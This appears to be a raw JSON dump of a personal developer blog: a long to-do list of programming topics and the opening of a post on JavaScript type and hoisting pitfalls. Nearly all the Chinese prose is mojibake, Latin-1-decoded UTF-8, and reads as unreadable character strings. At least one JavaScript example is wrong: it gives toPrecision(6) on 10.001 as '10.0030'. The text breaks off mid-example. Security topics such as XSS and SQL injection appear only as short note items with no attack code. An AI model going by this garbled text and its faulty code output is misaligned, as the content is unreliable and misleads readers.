å¦‚ä½•åœ¨å®¿ä¸»Appä¸­æå–ä¸€ä¸ªapkæ–‡ä»¶å¹¶åŠ è½½ä»£ç å’Œèµ„æº [ ] nodejs ,go ,protobuf rpc(protoæ›´å¤šçš„æ˜¯ä½œä¸ºä¸€ç§åè®®æ¥è¿›è¡Œrpcæ•°æ®ä¼ è¾“) [ ] Coordinator behaviorä»¥åŠscrollåŸç† [ ] instagramå¥½åƒé€šè¿‡æ³¨è§£çš„æ–¹å¼è‡ªå·±å†™äº†ä¸€ä¸ªjsonè§£æå™¨ig-json-parser [ ] when it comes to design , how do we translate px, pt, em into sp,dp and others(è®¾è®¡æ–¹é¢çš„ï¼Œå„ç§å•ä½ä¹‹é—´çš„è½¬æ¢)? [ ] mqttæ¥å…¥å®è·µmqttæ˜¯å»ºç«‹åœ¨tcpåŸºç¡€ä¸Šçš„åº”ç”¨å±‚åè®®ï¼Œnettyä¹Ÿåšäº†å®ç° [ ] Kotlin Coroutines Tutorial (STABLE VERSION) [ ] å®‡å®™ç¬¬ä¸€ideç†Ÿæ‚‰ä½¿ç”¨ [ ] python code generator(ä»£ç ç”Ÿæˆå™¨) [ ] awkï¼Œæ­£åˆ™è¡¨è¾¾å¼è¿˜æœ‰æ•°æ®åº“è¿™äº›ä¹Ÿç®—ä¸€é—¨ç¼–ç¨‹è¯­è¨€ [ ]Luaè„šæœ¬æ˜¯ä¸€ä¸ªå¾ˆè½»é‡çº§çš„è„šæœ¬ï¼Œä¹Ÿæ˜¯å·ç§°æ€§èƒ½æœ€é«˜çš„è„šæœ¬ã€‚è·¯ç”±å™¨ä¸Šéƒ½æœ‰è¿è¡Œç¯å¢ƒï¼Œè¯­æ³•å’Œcè¯­è¨€å·®ä¸å¤šã€‚åœ¨nginxopenrestyé…ç½®æ–‡ä»¶ä¸­ä¹Ÿå¯ä½¿ç”¨ã€‚luaè¿˜å¯ä»¥å’Œjavaä»£ç äº’ç›¸è°ƒç”¨ï¼Œè¿˜æ‰¾åˆ°äº†ä¸€ä¸ªå°†luaç§»æ¤åˆ°androidå¹³å°çš„é¡¹ç›® è…¾è®¯çš„mmkvæ˜¯shared preferenceçš„æœ‰æ•ˆæ›¿ä»£å“ mmapçš„ä½¿ç”¨å€¼å¾—å­¦ä¹  ç®€å•çš„ç»„ä»¶åŒ–æ–¹æ¡ˆ mvc,mvp,mvvmè¿™äº›å…³é”®æœ¯è¯­çš„æŒæ¡è¿˜æ˜¯å¿…è¦çš„ Parcelable æ˜¯æ€ä¹ˆå®ç°è·¨è¿›ç¨‹çš„? ipcå¹¶ä¸ä»…é™äºåå°ï¼Œå®¢æˆ·ç«¯ä¸åŒè¿›ç¨‹é—´ä¹Ÿä¼šæœ‰ç±»ä¼¼çš„æ¦‚å¿µã€‚ Perlè¢«ç§°ä¸ºè„šæœ¬è¯­è¨€ä¸­çš„ç‘å£«å†›åˆ€ï¼Œå¤„ç†æ–‡æœ¬å’Œæ­£åˆ™çš„èƒ½åŠ›æ¯”è¾ƒå¼ºã€‚å­¦ä¹ perl5å°±å¯ä»¥äº†ã€‚ Spring Boot application.yml å†™æ³• åç«¯é¢è¯•é¢˜ thrift æºç è§£æï¼Œrpcæ¡†æ¶ï¼ˆæ¯”æ–¹è¯´äººè„¸è¯†åˆ«åº”ç”¨å°±å¯ä»¥ç”¨javaè°ƒç”¨pythonæœåŠ¡ï¼‰è¿™ç§rpcè¿‡ç¨‹è‚¯å®šè¦è€ƒè™‘å­—èŠ‚åºçš„é—®é¢˜ã€‚ å¾®æœåŠ¡æ¡†æ¶ dubbo kubernetes, Spring Cloudâ€¦. [ ] java BitSetè¿™ä¸ªclassçš„ä½¿ç”¨åŠæ•ˆç‡ [ ] å…³äºtextViewæºç çš„è§£æè¦è¡¥ä¸Š [ ] Replacing JNI Crashes by Exceptions on Android å·²å®Œæˆ ç”¨ express è½¬æ¥ä¸€ä¸ªçŸ¥ä¹ Apiï¼Œæ·»åŠ  Access-control-allow-origin,æˆ–è®¸è¿˜å¯ä»¥ç”¨ redis ç¼“å­˜æ•°æ®ç»“æœï¼ˆä¸€ä¸ªå°±å¥½ï¼‰ç”±æ­¤æƒ³åˆ°ä¸€ç¯‡æ–‡ç« â€How to use Python to build a restful Web Serviceâ€.åªä¸è¿‡ç”¨çš„æ˜¯ Tornado git hook (github travis æŒç»­é›†æˆï¼Œgit push ä¼šè§¦å‘æœåŠ¡å™¨çš„ä¸€ç³»åˆ—æ“ä½œ) åŸºäºå‰åç«¯åˆ†ç¦»çš„ç†å¿µï¼Œåå°åªè´Ÿè´£æä¾›æ•°æ®ï¼Œrender page çš„ä»»åŠ¡åº”è¯¥äº¤ç»™å‰ç«¯ã€‚ï¼ˆæ‰€ä»¥ç”¨ express-handlebars å†™é¡µé¢çš„æ–¹å¼å†™ç€å¾ˆç´¯ï¼‰ é›†æˆ travis-ciï¼Œè®°å¾— after-success script çš„ç»“æœå¹¶ä¸ä¼šå½±å“ build çš„ç»“æœï¼ˆå³ï¼Œafter-success æ‰§è¡Œè„šæœ¬å‘ç”Ÿäº†é”™è¯¯ï¼Œåœ¨æ—¥å¿—é‡Œæœ‰è¾“å‡º errorï¼Œä½†å®é™…æ˜¾ç¤ºçš„ build result ä»ä¸º successï¼‰ï¼Œè¿˜æœ‰ travis çš„è¾“å‡º log éœ€è¦é»˜è®¤æ˜¯æŠ˜å çš„ï¼Œè¦å±•å¼€æ‰èƒ½çœ‹æ¸…æ¥šï¼Œä½†åœ¨ afterSuccess é‡Œé¢çš„æŒ‡ä»¤çš„è¾“å‡ºä¸€å®šæ˜¯æœ‰çš„ã€‚ éšä¾¿æ”¾ä¸€ä¸ªæ–‡ä»¶åˆ°/usr/bin/å°±å¯ä»¥ç›´æ¥è°ƒç”¨è¿™ä¸ªæ–‡ä»¶åæ¥èµ·è¿™ä¸ªå‘½ä»¤äº†å—ï¼Ÿï¼ˆå®é™…æ“ä½œåªéœ€è¦å»ºç«‹ä¸€ä¸ªsymbolic linkå°±å¥½äº†ï¼‰ å•ä¸ªç½‘å¡æœ€å¤š65535ä¸ªç«¯å£ï¼Œc10Kã€‚65536å…¶å®ä¸æ˜¯æ“ä½œç³»ç»Ÿé™åˆ¶çš„ï¼Œè€Œæ˜¯tcpåè®®å°±åªç»™portç•™äº†2ä¸ªbytesç»™source portï¼Œåªç•™äº†2ä¸ªbytesç»™destination portç«¯å£å·å†™åœ¨tcpåŒ…é‡Œï¼Œipåœ°å€ä¸æ˜¯ï¼Œipåœ°å€æ˜¯ipå±‚çš„äº‹æƒ… oAuth2åŸç†ï¼Œå…¶å®æµç¨‹ä¸Šå’Œå¾ˆå¤šå®¢æˆ·ç«¯çš„å¾®ä¿¡ç™»é™†ï¼Œæ–°æµªå¾®åšç™»é™†å¾ˆåƒçš„ åœ¨Androidæ‰‹æœºä¸Šå°è¯•ç”¨ä¸€ä¸ªunix domain socketç”¨äºlocalhostè¿›ç¨‹é—´ipc(å…¶å®å°±æ˜¯ä¿è¯ç«¯å£å·ä¸€è‡´ï¼Œç»™ç½‘ç»œæƒé™å°±å¥½äº†)ã€‚æœ‰ä¸€ä¸ªjnré¡¹ç›®ï¼Œç”¨jniçš„æ–¹å¼æä¾›äº†å„ä¸ªå¹³å°ä¸Šçš„unix domain socketçš„javaè°ƒç”¨å®ç°ã€‚ å†™ groovy ç”¨intelijå…¨å®¶æ¡¶å°±å¯ä»¥äº†ï¼Œgroovyçš„è¯­æ³•å…¶å®æ²¡ä»€ä¹ˆï¼Œä¸»è¦æ˜¯äº†è§£ç¼–è¯‘çš„æµç¨‹å’ŒåŸºæœ¬åŸç†ï¼Œè¿™ä¸ªéœ€è¦çœ‹official doc å¼€å‘gradle pluginä¼˜åŒ–MultiDexã€‚é•¿è¿œæ¥çœ‹ï¼Œ5.0ä»¥åçš„æ‰‹æœºè¶Šæ¥è¶Šå¤šï¼ŒMultiDexä¹Ÿä¸å€¼å¾—è¿‡äºå…³æ³¨ã€‚ intelij ç‚¹å‡»run å®é™…è°ƒç”¨çš„command lineæ˜¯ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯javacï¼Œç¼–è¯‘å‡ºæ¥çš„classæ–‡ä»¶æ”¾åˆ°äº†targetæ–‡ä»¶å¤¹ï¼Œç´§æ¥ç€ç”¨javaå‘½ä»¤å¸¦ä¸Šä¸€å¤§ä¸²classpathå»è°ƒç”¨ä¸»å‡½æ•° Android Studio ç¼–è¯‘è¿‡ç¨‹ï¼Œå…¶å®å°±æ˜¯gradle assembleXXX å¥½äº†ä¹‹åadb pushåˆ°æ‰‹æœºä¸Šï¼Œå†å®‰è£…ï¼Œæœ€åèµ·ä¸»ç•Œé¢ Android ç¼–è¯‘åŠ Dex è¿‡ç¨‹æºç åˆ†æ å¦‚ä½•è°ƒè¯• Android æ‰“åŒ…æµç¨‹ï¼Ÿï¼Œä¸€ä¸ªremoteçš„äº‹ ä¸€ä¸ªç”¨äºä¼˜åŒ– png å›¾ç‰‡çš„ gradle æ’ä»¶ï¼Œç”¨æ¥çœ‹ groovy è¯­æ³•æŒºå¥½çš„ã€‚ä»¥åŠ How to write gradle plugin XSS æ”»å‡»,DOM basedå’ŒStored XSS,åŸºæœ¬ä¸Šå°±æ˜¯ä¸è¦ç›¸ä¿¡ç”¨æˆ·çš„è¾“å…¥ï¼Œé™¤äº†åˆæ³•è¾“å…¥ä»¥å¤–ä¸€å¾‹è¿‡æ»¤æ‰ Websocket nodejsï¼Œå±€é™æ€§å°±æ˜¯å‰åå°éƒ½å¾—ç”¨socket.ioçš„åº“ã€‚å‰ç«¯æ˜¯æµè§ˆå™¨çš„è¯è¿˜å¥½ï¼Œappçš„è¯java,Androidéƒ½æœ‰å¯¹åº”çš„å®ç°.[å…¶å®å°±æ˜¯socket io] [ä½¿ç”¨Spring bootåå°æä¾›protobufæ¥å£å®ç°å®¢æˆ·ç«¯é€šä¿¡] ä¸è¦ä½¿ç”¨protobf-gradle-pluginäº†ã€‚ç›´æ¥å†™è„šæœ¬ç”¨protocå»ç”Ÿæˆæ–‡ä»¶ï¼ŒæŒ‡å®šç”Ÿæˆæ–‡ä»¶çš„è·¯å¾„è¦å’Œprotoé‡Œé¢å†™çš„åŒ…åå¯¹çš„ä¸Šã€‚å¦å¤–å°±æ˜¯å®¢æˆ·ç«¯å’Œserverç«¯ä¾èµ–çš„protobufç‰ˆæœ¬ä»¥åŠprotocå·¥å…·çš„ç‰ˆæœ¬å¾—ä¸€è‡´ï¼Œæ¯”å¦‚éƒ½æ˜¯3.5ã€‚è¿˜æœ‰å°±æ˜¯protocçš„è¯­æ³•ï¼Œä»€ä¹ˆimportçš„æ¯”è¾ƒçƒ¦ã€‚ [X] ä½¿ç”¨jinja2ç”Ÿæˆæ–‡ä»¶ã€‚ä¸€ä¸ªæ¯”è¾ƒå¥½ç©çš„ä»£ç ç”Ÿæˆå™¨ [X] URL Encoding,å°±æ˜¯é‚£ä¸ªåœ¨ç½‘å€é‡ŒæŠŠå­—ç¬¦è½¬æˆç™¾åˆ†å·åŠ ä¸ŠUTF-8çš„æ‰¾åˆ°äº†é˜®ä¸€å³°è€å¸ˆçš„è§£é‡Š [X] é€šè¿‡file inputä¸Šä¼ å›¾ç‰‡ï¼ŒåŸç”Ÿajaxä»¥åŠAjaxï¼Œè‡ªå·±æ­å»ºä¸Šä¼ æœåŠ¡å™¨å¤§æ¦‚èƒ½çŒœåˆ°æš´é£å½±éŸ³çš„å±€åŸŸç½‘ä¼ è¾“å®ç°äº†ç”¨flaskçš„è¯è‡ªå·±æ­å»ºå¥½åå°æœ€ç®€å•äº†ï¼Œæœ€å¤šå†ä½¿ç”¨flask-wtfå’Œflask-uploadè§„èŒƒæ“ä½œ [X]Promise é“¾å¼è°ƒç”¨ä¸ç»ˆæ­¢ï¼Œå¼‚å¸¸å¤„ç†(åªæ˜¯ä¸€ä¸ªå·¥å…·è€Œå·²) [X] Android åº”ç”¨æ¥å…¥buglyçƒ­ä¿®å¤ï¼Œä¸Šçº¿ä¹‹åå°±ä¸ç”¨èƒŒé”…äº†ï¼ˆæœ‰å…´è¶£çœ‹çœ‹sevenZip.jarï¼Œæš‚æ—¶æ²¡çœ‹ï¼‰ [X] nettyä½œè€…çš„åšå®¢ä»¥åŠjvm çš„inlineç­‰ä¼˜åŒ– [ ] å¦‚ä½•å†™makefileå…¶å®è¿™ä¸ªæ›´åŠ friendly [X] libmp3lameç§»æ¤åˆ°Android,è¯¥æ•™ç¨‹é’ˆå¯¹çš„lameç‰ˆæœ¬æ˜¯3.99.5 scheme è¿™ä¸œè¥¿ç®—è·¨å®¢æˆ·ç«¯å¹³å°çš„ï¼Œæ¯”å¦‚åœ¨ App ä¸­è°ƒèµ·æ”¯ä»˜å®(ç”¨çš„æ˜¯ alipayqr://)ã€‚å…¶å®å°±æ˜¯ä¸€ä¸ªç³»ç»Ÿå†…è·¨åº”ç”¨è°ƒç”¨ã€‚ç”¨æ³•è¿™ä¸ªä¸»è¦æ˜¯ios appä¹‹é—´é€šä¿¡çš„åè®®ï¼Œä»¥åŠå¿«é€Ÿè·³è½¬æŸä¸ªappæŸä¸ªé¡µé¢çš„åŠŸèƒ½å®ç°ï¼Œè¿˜æœ‰x-callback-URLè¿™æ ·ç±»ä¼¼çš„åè®®ã€‚ä¸è¿‡æœ‰äº†3d-touchï¼ˆè‹¹æœåæ¥åˆæŠŠ3D-Touchå¹²æ‰äº†ï¼‰ä¹‹åï¼Œå¾ˆå¤šappéƒ½èƒ½é•¿æŒ‰å›¾æ ‡è¿›å…¥é¡µé¢ï¼Œæ‰€ä»¥url schemeè¿™ä¸ªåŠŸèƒ½åªèƒ½è¯´æ˜¯ä¸å¤å¾€æ—¥è¾‰ç…Œäº† [X]linuxçš„sedå‘½ä»¤(æ–‡æœ¬æ›¿æ¢æ¯”è¾ƒå¸¸ç”¨) nio è¿˜æ˜¯nettyå¥½ã€‚ä¹Ÿå¯ä»¥çœ‹ç‚¹åˆ«çš„å¹¶å‘ç¼–ç¨‹ç½‘ [X]js çš„async await,å°±æ˜¯ä¸€ä¸ªasyncä¿®é¥°ä¸€ä¸ªmethodï¼Œé‡Œé¢éšä¾¿å†™await, await on ä¸€ä¸ªPromiseå°±å¯ä»¥äº† [X] Linuxä¸‹TCPå»¶è¿Ÿç¡®è®¤æœºåˆ¶ ä»¥åŠsocket timeoutçš„éƒ¨åˆ†åŸå› ï¼ˆnet.ipv4.tcp_syn_retriesï¼Œå¦‚æœ TCP æ¡æ‰‹çš„ SYN åŒ…è¶…æ—¶é‡è¯•æŒ‰ç…§ 2 çš„å¹‚æ¥ backoffï¼‰ [X]cè¯­è¨€çš„libeventä½¿ç”¨æ•™ç¨‹ eventloopï¼Œæ·»åŠ å›è°ƒï¼Œå¤§è‡´çš„æµç¨‹å°±æ˜¯è¿™æ · [X] indexed DB,æµè§ˆå™¨ç«¯æ•°æ®åº“ï¼Œè¿˜æ˜¯ç”¨ç¬¬ä¸‰æ–¹åº“å¥½ [X] block size vs page size Pageæ˜¯å†…å­˜ç›¸å…³ï¼Œblockæ˜¯ç¡¬ç›˜ç›¸å…³çš„ [X] python çš„asyncio(eventloop , generator, coroutine) [X]Vim cheet sheet vimå¤šç”¨ç”¨å°±ç†Ÿæ‚‰äº†ã€‚ [X] python dunder classå¤ä¹ ã€‚çŸ¥é“æœ‰python descriptorè¿™å›äº‹å°±è¡Œäº†ã€‚ [X] formè¡¨å•å¯ä»¥è·¨åŸŸä¸€ä¸ªæ˜¯å†å²åŸå› è¦ä¿æŒå…¼å®¹æ€§ï¼ˆå°±æ˜¯è¯´è·¨åŸŸè¿™ä»¶äº‹ï¼Œä¸€ä¸ªåŸŸåçš„ JS ï¼Œåœ¨æœªç»å…è®¸çš„æƒ…å†µä¸‹ï¼Œä¸å¾—è¯»å–å¦ä¸€ä¸ªåŸŸåçš„å†…å®¹ã€‚ä½†æµè§ˆå™¨å¹¶ä¸é˜»æ­¢ä½ å‘å¦ä¸€ä¸ªåŸŸåå‘é€è¯·æ±‚ã€‚æ‰€ä»¥postçš„è¡¨å•å¯ä»¥å‘å‡ºå»ï¼Œä½†æ˜¯åˆ«æŒ‡æœ›èƒ½å¤Ÿæ‹¿åˆ°responseï¼‰ [X] a new article on open-gl intro(åœ¨Androidå¹³å°ä¸Šè¦å’ŒMediaCodecç›¸å…³çš„éŸ³è§†é¢‘æ ¼å¼ç»“åˆç€æ¥ä¸€èµ·çœ‹) [X] JavaScriptä¸­new FileReader(å±äºhtml5çš„ä¸œè¥¿)ï¼Œä»¥åŠcanvas api(lineTo,quardToè¿™äº›éƒ½æ˜¯ç›¸è¿‘çš„),ä»¥åŠjsè¿›è¡Œå›¾ç‰‡ç¼©æ”¾å’Œè£å‰ª [X] tcp-proxyå®ç”¨æ•™ç¨‹ [X]Exoplayer and the MediaCodec apibuilding-a-video-player-app-in-android AC2016è…¾è®¯å‰ç«¯æŠ€æœ¯å¤§ä¼š 1 1 1 H5ç›´æ’­é‚£äº›äº‹ [X] tcp-proxyå®ç”¨æ•™ç¨‹(tcp replay or udp relay) [X] render-script utility [X]Cè¯­è¨€forkè¿›ç¨‹ä»¥åŠè¿›ç¨‹ä¹‹é—´é€šä¿¡çš„å¥—è·¯ [X] flex,grid. cssçš„box-sizeçœŸæ˜¯å‘äºº [X] rxjavaæ˜¯å¦‚ä½•åˆ‡æ¢çº¿ç¨‹çš„ä»¥åŠæºç è§£æï¼ŒObserveOnObserverå’ŒObservableSubscribeOnå®ä¾‹æ˜¯æ¡¥æ¢ [X] jdk7å¼€å§‹æä¾›fork join poolæ–¹æ³•ï¼Œå°†ä»»åŠ¡åˆ†é…åˆ°å¤šä¸ªçº¿ç¨‹ä¸Šå¤„ç†(ä¸é€‚åˆioå¯†é›†å‹æ“ä½œ) [X] openjdkçš„Cè¯­è¨€å®ç°å¯ä»¥éšä¾¿è°ƒå‡ å¤„æ¥çœ‹çœ‹ [X] å®‰è£…å¹¶ä½¿ç”¨MAT åˆ†æjavaåº”ç”¨å†…å­˜ã€‚ [X]how does jvm parse class file and the code structure of .class file(how do we manipulate .class file like in asm) ç…§ç€ä¸€ä¸ªjava classfile viewerçœ‹ç»“æ„å°±å¯ä»¥äº†ï¼Œå¦‚æœä¸æ˜¯æ‰“ç®—æ·±å…¥è™šæ‹Ÿæœºçš„è¯ï¼Œæ²¡å¿…è¦ã€‚ [X] javaçš„aspectJæ•™ç¨‹(AspectJ å±äºé™æ€ç»‡å…¥ï¼Œæ˜¯åœ¨ç¼–è¯‘æœŸé—´ç”Ÿæˆä»£ç†ç±»ï¼Œæ€§èƒ½ä¼˜äºåŠ¨æ€ç»‡å…¥)ã€‚Spring AOPä¸AspectJ å®ç°åŸç†ä¸Šå¹¶ä¸å®Œå…¨ä¸€è‡´. Springæä¾›äº†ä¸¤ç§æ–¹å¼æ¥ç”Ÿæˆä»£ç†å¯¹è±¡: JdkProxy(åŸºäºjdkåŠ¨æ€ä»£ç†,å‰ææ˜¯ç›®æ ‡æ˜¯æœ‰æ¥å£çš„)å’ŒCglib(åŸºäºasmï¼Œç”¨äºå®ç°å¯¹ç±»çš„ä»£ç†)ã€‚å®é™…ä¸Šï¼ŒSpring åªæ˜¯ä½¿ç”¨äº†ä¸ AspectJ ä¸€æ ·çš„æ³¨è§£ï¼Œæ²¡æœ‰ä½¿ç”¨ AspectJ çš„ç¼–è¯‘å™¨ ï¼Œè½¬å‘é‡‡ç”¨åŠ¨æ€ä»£ç†æŠ€æœ¯çš„å®ç°åŸç†æ¥æ„å»º Spring AOP çš„å†…éƒ¨æœºåˆ¶ï¼ˆåŠ¨æ€ç»‡å…¥ï¼‰ï¼Œè¿™æ˜¯ä¸ AspectJï¼ˆé™æ€ç»‡å…¥ï¼‰æœ€æ ¹æœ¬çš„åŒºåˆ«ã€‚ [X] jsçš„é—­åŒ…ï¼ˆclosureï¼‰ç­‰é¢è¯•å¸¸è°ˆ closure under the hood [X] build a program that use libcurl , sudo apt install liccurl4-openssl-dev,ç¼–è¯‘æ—¶ä½¿ç”¨gcc -lcurl,curl performæ˜¯åŒæ­¥çš„ã€‚ [X]content-disposition [x] ç”¨æ­£åˆ™æ£€æµ‹æˆ–è€…è§£æjson(jQueryæºç é‡Œæœ‰) åœ¨çº¿æ­£åˆ™æ£€æµ‹ç½‘ç«™ï¼Œä¹Ÿå°±æ˜¯Jsä¸­çš„Regå¯¹è±¡ [X] Reduxå’ŒFluxå¾ˆåƒ,react context api(æ„Ÿè§‰æœ‰ç‚¹åƒè§‚å¯Ÿè€…æ¨¡å¼) embeed video with iframe jdk8 standard Library implementation detail(javaä»£ç çš„å®ç° â€“&gt; hotspotä»£ç çš„cè¯­è¨€å®ç°) å¾ˆå¤šéƒ½æ˜¯c++å†™çš„ [X] ç†Ÿç»ƒæŒæ¡java8çš„stream,lambda,optionalç­‰è¯­æ³•ã€‚è¿˜æ˜¯è¦å¤šå¤šç»ƒä¹  Good For Nothing [ ] ç”¨GDBè°ƒè¯•ç¨‹åº [ ] npm install graphql(mostly a server side javascript stuff) ä½¿ç”¨ express æ¨¡æ‹Ÿç½‘ç»œå»¶è¿Ÿ åŸºäº Docker æ‰“é€ å‰ç«¯æŒç»­é›†æˆå¼€å‘ç¯å¢ƒ vS Code Vender Prefix plugin =&gt; auto prefix loader å‰åç«¯åˆ†ç¦» sqlæ¼æ´ æ·±å…¥æµ…å‡ºè…¾è®¯äº‘ CDNï¼šç¼“å­˜ç¯‡ä¸ç®¡SSDç›˜æˆ–è€…SATAç›˜éƒ½æœ‰æœ€å°çš„æ“ä½œå•ä½ï¼Œå¯èƒ½æ˜¯512Bï¼Œ4KBï¼Œ8KBã€‚å¦‚æœè¯»å†™è¿‡ç¨‹ä¸­ä¸è¿›è¡Œå¯¹é½ï¼Œåº•å±‚çš„ç¡¬ä»¶æˆ–è€…é©±åŠ¨å°±éœ€è¦æ›¿åº”ç”¨å±‚æ¥åšå¯¹é½æ“ä½œï¼Œå¹¶å°†ä¸€æ¬¡è¯»å†™æ“ä½œåˆ†è£‚ä¸ºå¤šæ¬¡è¯»å†™æ“ä½œã€‚ Androidè¿›ç¨‹çš„åŠ è½½æµç¨‹ å‰åç«¯åŒæ„ install nginx , jenkin ci, deploying nginx in docker(Http Load Balaning with Docker and nginx) [ ] ç½‘æ˜“äº‘éŸ³ä¹API [X] Djangoéƒ¨ç½²ä¸ªäººç½‘ç«™(Gunicornï¼ŒNginx)ã€‚djangoå†™templateå°±ä¸æ˜¯å‰åç«¯åˆ†ç¦»äº† [ ] Dockerintro-to-docker-building-android-app è¿™ç¯‡æ–‡ç« å…¶å®æ˜¯ä¸¤ä»¶äº‹ï¼Œä¸€ä¸ªæ˜¯Build docker image(docker build xxxx),å¦ä¸€ä¸ªæ˜¯run (docker run xxx) [ ] å’Œç½‘é¡µç±»ä¼¼ï¼ŒActivityä¹Ÿæœ‰ä¸€ä¸ªrefererçš„æ¦‚å¿µï¼Œç”¨äºåˆ¤æ–­å½“å‰é¡µé¢æ˜¯ç”±è°å‘èµ·è¯·æ±‚çš„OpenTypeÂ® is a cross-platform font file format developed jointly by Adobe and Microsoft. [ ]deploying owncloud using docker owncloudå®˜æ–¹çš„é…åˆdockerå®‰è£…æ•™ç¨‹ç½‘ç›˜è¿™ç§ä¸œè¥¿çœ‹ä¸ªäººå–œå¥½äº† [ ]CloudFlare cdnè§£æä»¥åŠDNSé˜²æŠ¤ [ ] python c extension [ ] æœ€ç®€å•çš„ä¸€ä¸ªç”¨goå†™å‡ºæ¥çš„rest apiå¤§æ¦‚é•¿è¿™æ · [ ]åˆ†è¯å™¨ [ ]LOGSTASH+ELASTICSEARCH+KIBANAå¤„ç†NGINXè®¿é—®æ—¥å¿—ELKå…¨å®¶æ¡¶, logstashæ¥ç®¡è½¯ä»¶æ—¥å¿— [ ] å¦‚ä½•ç¼–å†™ jQuery æ’ä»¶ netfilteræ¡†æ¶(imbedded in linux server) [] javaå®ç°lambdaçš„åŸç†invokedynamicä»¥åŠLambdaMetafactoryç­‰ [ ] libuv,elfæ–‡ä»¶æ ¼å¼è§£æ [X] WebSocketåè®®åŠæ•°æ®å¸§ [ ] linuxç¯å¢ƒä¸‹å¤šè¿›ç¨‹é€šè®¯æ–¹å¼(ç®¡é“ï¼Œå…±äº«å†…å­˜ï¼Œä¿¡å·,unix domian socket) [ ] play around with xposed [ ] python guiç¼–ç¨‹ [ ] æ¥æ¥æ¥ï¼Œæ‰‹å†™ä¸€ä¸ªvm [ ]How the JVM compiles bytecode into machine code [ ] chromiumæä¾›äº†å¦‚ä½•åœ¨windowsä¸Šç¼–è¯‘chromiumçš„æ•™ç¨‹ iviewï¼ŒelementUi [ ]ä¸€è‡´æ€§å“ˆå¸ŒåŸç† [ ] ä½¿ç”¨rediså®ç°ä½ç²’åº¦çš„åˆ†å¸ƒå¼é” [ ] python sendall will block? what if tcp buffer is full , like when advertised windows size is zero. tcp flow control [ ] rust and WebAssembly, WebAssembly å¹¶ä¸æ˜¯ä¸€é—¨ç¼–ç¨‹è¯­è¨€ï¼Œè€Œæ˜¯ä¸€ä»½å­—èŠ‚ç æ ‡å‡†ï¼Œéœ€è¦ç”¨é«˜çº§ç¼–ç¨‹è¯­è¨€ç¼–è¯‘å‡ºå­—èŠ‚ç æ”¾åˆ° WebAssembly è™šæ‹Ÿæœºä¸­æ‰èƒ½è¿è¡Œï¼Œ æµè§ˆå™¨å‚å•†éœ€è¦åšçš„å°±æ˜¯æ ¹æ® WebAssembly è§„èŒƒå®ç°è™šæ‹Ÿæœº jsonplaceholderæ‡’å¾—è‡ªå·±å†™apiçš„è¯å°±ç”¨è¿™ä¸ªå§ console.log(\"hey there\")","tags":[{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"javaScriptä¸­çš„common mistakes","date":"2020-01-29T17:20:16.000Z","path":"2020/01/29/2020-01-29-javascript-the-weird-parts/","text":"javaScriptä¸­çš„ä¸€äº›å®¹æ˜“çŠ¯é”™çš„åœ°æ–¹ ğŸ‚ ğŸˆ ğŸ… ğŸ¦ ğŸŒ¶ ğŸ¥’ ğŸ‘ çœŸæ˜¯ä¸€é—¨ç¥å¥‡çš„è¯­è¨€ğŸ‰ ğŸŒ® ä»w3schoolå­¦åˆ°ä¸€äº›æ–°çš„çŸ¥è¯† 5ç§åŸºæœ¬æ•°æ®ç±»å‹string number boolean object function 6ç§object ç±»å‹Object Date Array String Number Boolean ä¸¤ç§æ¯”è¾ƒç‰¹æ®Šçš„ï¼Œä¸å«valueçš„ç±»å‹null undefined ä½¿ç”¨typeofå…³é”®å­—å¯ä»¥æŸ¥çœ‹å¯¹åº”çš„ç±»å‹ï¼Œtypeofæ˜¯ä¸€ä¸ªæ“ä½œç¬¦ï¼Œè¿”å›å€¼ä¸€å®šæ˜¯ä¸€ä¸ªstring typeof &quot;John&quot; // Returns &quot;string&quot; typeof 3.14 // Returns &quot;number&quot; typeof NaN // Returns &quot;number&quot; typeof false // Returns &quot;boolean&quot; typeof [1,2,3,4] // Returns &quot;object&quot; typeof {name:&#39;John&#39;, age:34} // Returns &quot;object&quot; typeof new Date() // Returns &quot;object&quot; typeof function () {} // Returns &quot;function&quot; typeof myCar // Returns &quot;undefined&quot; * typeof null // Returns &quot;object&quot; typeof undefined // Return &quot;undefined&quot; ä½†æ˜¯typeofæ— æ³•åˆ¤æ–­ä¸€ä¸ªobjectæ˜¯ä¸æ˜¯arrayæˆ–è€…æ˜¯ä¸æ˜¯date function isArray(myArray) { return myArray.constructor.toString().indexOf(&quot;Array&quot;) &gt; -1; } //æˆ–è€… function isArray(myArray) { return myArray.constructor === Array; } // å†æˆ–è€… Array.isArray() //The isArray() method checks whether an object is an array //Dateå°±å¾—è¿™ä¹ˆåˆ¤æ–­ function isDate(myDate) { return myDate.constructor === Date; } //stringè½¬intï¼Œå±…ç„¶è¿™ä¹Ÿè¡Œ parseInt(&quot;10 years&quot;) 10 parseFloat(&#39;20.12HAHA1&#39;) // 20.12 //ä¸€äº›è‡ªåŠ¨çš„ç±»å‹è½¬æ¢çš„ç»“æœå°±è®©äººçœ‹ä¸æ‡‚äº† &quot;5&quot; + 2 // &quot;52&quot; &quot;5&quot; - 2 // 3 // numberè½¬string let n = 10.001 n.toFixed(2) // &quot;10.00&quot; å¯ä»¥è®¤ä¸ºtoFixedå°±æ˜¯ä¿ç•™å°æ•°ç‚¹åå‡ ä½æ•°å­—äº† n.toFixed(3) // &quot;10.001&quot; n.toPrecision(6) // &quot;10.0030&quot; å¯ä»¥è®¤ä¸ºtoPrecisionæ˜¯è¿å¸¦æ•´æ•°ä½ä¿ç•™å‡ ä½æ•°å­— ä¸€ä¸ªå‡½æ•°çš„è¿”å›å€¼å¯ä»¥æ˜¯å¤šç§ç±»å‹Javascript: Different return types somefn = function(e) { switch (e.type) { case &#39;mousedown&#39;: return false; case &#39;mousemove&#39;: return {x:10, y:20}; } }; somefn({type: &#39;foo&#39;}); //undefined ä»¥ä¸Šå‡½æ•°å®Œå…¨å¯ä»¥è¿è¡Œ ç¥å¥‡çš„hoistHoisting is JavaScriptâ€™s default behavior of moving all declarations to the top of the current scope (to the top of the current script or the current function ä¸€ä¸ªå˜é‡å¯ä»¥å…ˆä½¿ç”¨å†å£°æ˜ï¼ˆä½¿ç”¨varå…³é”®å­—çš„è¯ï¼‰ï¼Œä½†æ˜¯Variables and constants declared with let or const are not hoisted! hoistingå¯¹äºå‡½æ•°ä¹Ÿæœ‰å½±å“var functionName = function() {} vs function functionName() {} è¿™ä¿©æœ‰ä»€ä¹ˆåŒºåˆ« // functionOne 